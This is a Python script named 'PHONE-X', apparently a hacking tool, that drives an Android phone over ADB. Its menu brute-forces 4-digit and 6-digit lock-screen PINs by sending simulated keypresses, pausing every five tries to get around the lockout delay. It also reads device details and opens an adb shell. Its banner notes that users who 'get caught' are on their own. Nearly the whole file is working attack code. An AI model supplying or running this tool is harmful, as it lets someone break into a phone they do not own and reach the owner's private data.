import os 
import time
import subprocess
time.sleep(1)

Credits = "Made by: Geekcoder"

cmd = 'apt install adb && pip install colorama && pip install --upgrade pip'
os.system(cmd)

from colorama import Fore

link = 'https://developer.android.com/tools/releases/platform-tools'
print(f"\n{Fore.YELLOW}Make Sure 'adb' is installed or download it on {Fore.BLUE}{link}")

print(f"""{Fore.RED}
██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗   ██╗  ██╗
██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝   ╚██╗██╔╝
██████╔╝███████║██║   ██║██╔██╗ ██║█████╗█████╗╚███╔╝ 
██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝╚════╝██╔██╗ 
██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗   ██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝  ╚═╝""")


time.sleep(1)
print(f"""\n
	{Fore.RED}WARNING!!{Fore.YELLOW}
	This tool is for education purposes only, use it for your own good,
	If you get caught your on on your own{Fore.GREEN}
	{Credits}
	""")
def main():
	time.sleep(1)
	choice = ['\n[1.] Brute Force','[2.] Get info','[3.] Open Shell','[4.] Exit']

	for i in choice:
		print(i)

	while True:
		print("")	
		answer = input("-> ")
		
		if answer == "1":
			print("\nChoose a type of bruteforce\n")
			choices = ['\n[1.] 4 Digit Passcode','[2.] 6 Digit Passcode','[3.] Back\n']
			for this in choices:
				print(this)
			time.sleep(1)

			answers1 = input("=> ")

			if answers1 == "1":

				def brute_force_pin():
					lock_button = "adb shell input keyevent 26"
					unlock_button = "adb shell input keyevent 82"
					enter_button = "adb shell input keyevent 66"
					swipe = "adb shell input swipe 407 1211 378 85"

					print("Brute Pin 4 Digit")
					for i in range(0, 10000):
						pin = str(i).zfill(4)
						print("Try =>", pin)

						for digit in pin:
							key_event = "adb shell input keyevent " + str(int(digit) + 7)
							subprocess.call(key_event, shell=True)

						subprocess.call(enter_button, shell=True)

						if (i + 1) % 5 == 0:
							subprocess.call(enter_button, shell=True)
							print("Delay Limit 30s")
							time.sleep(30)
							subprocess.call(unlock_button, shell=True)
							subprocess.call(swipe, shell=True)

				brute_force_pin()

			elif answers1 == "2":
				

				def brute_force_pin():
					subprocess.call("adb shell input keyevent 26", shell=True)  # Pressing the lock button
					subprocess.call("adb shell input keyevent 82", shell=True)

					print("Brute Pin 6 Digit")
					for i in range(0, 1000000):
						pin = str(i).zfill(6)
						print("Try =>", pin)

						for digit in pin:
							subprocess.call(f"adb shell input keyevent {int(digit) + 7}", shell=True)

						subprocess.call("adb shell input keyevent 66", shell=True)

						if (i + 1) % 5 == 0:
							subprocess.call("adb shell input keyevent 66", shell=True)
							print("Delay Limit 30s")
							secs = 30
							while secs > 0:
								print(f"{secs}\033[0K\r", end="")
								time.sleep(1)
								secs -= 1

							time.sleep(30)
							subprocess.call("adb shell input keyevent 82", shell=True)
							subprocess.call("adb shell input swipe 407 1211 378 85", shell=True)

				brute_force_pin()
			
			elif answers1 == "3":
				print(main())

		elif answer == "2":
			time.sleep(1)


			def get_device_info():
				manu = subprocess.check_output("adb shell getprop ro.product.manufacturer", shell=True).decode().strip()
				model = subprocess.check_output("adb shell getprop ro.product.model", shell=True).decode().strip()
				version = subprocess.check_output("adb shell getprop ro.build.version.release", shell=True).decode().strip()
				sdk = subprocess.check_output("adb shell getprop ro.build.version.sdk", shell=True).decode().strip()
				info = f"{manu} {model} {version} (API {sdk})"
				
				print("Info:", info)
				print("Manufacturer:", manu)
				print("Model:", model)
				print("Version:", version)
				print("Sdk:", sdk)

			get_device_info()

			break

		elif answer == "3":
			command1 = """adb shell"""
			os.system(command1)
			break

		elif answer == "4":
			
			print(f"""{Fore.RED}
 ██████╗  ██████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗███████╗
██╔════╝ ██╔═══██╗██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝
██║  ███╗██║   ██║██║   ██║██║  ██║██████╔╝ ╚████╔╝ █████╗  
██║   ██║██║   ██║██║   ██║██║  ██║██╔══██╗  ╚██╔╝  ██╔══╝  
╚██████╔╝╚██████╔╝╚██████╔╝██████╔╝██████╔╝   ██║   ███████╗
 ╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝    ╚═╝   ╚══════╝
                                                            
""")	
			time.sleep(1)
			print("\nHave a nice day!!")

			break
main()
